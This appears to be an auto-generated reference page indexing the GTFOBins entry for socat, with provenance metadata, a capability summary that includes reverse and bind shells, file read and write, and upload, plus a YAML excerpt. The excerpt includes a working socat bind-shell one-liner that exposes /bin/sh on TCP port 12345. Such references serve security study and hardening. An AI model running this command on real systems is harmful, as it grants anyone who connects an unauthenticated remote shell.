---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# socat

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `socat` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/socat` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for socat covering bind-shell, download, file-read, file-write, reverse-shell, shell, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/socat.md)
- Source verification: [source record](../../sources/gtfobins/socat.md)

## Aliases

- `socat`

## Source Verification

[source record](../../sources/gtfobins/socat.md)

## Evidence Excerpt

```text
_body: ''
_name: socat
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/socat
functions:
bind-shell:
- code: socat tcp-listen:12345,reuseaddr,fork exec:/bin/sh,pty,stderr,setsid,sigint,sane
connector: tcp-client-tty
contexts:
```
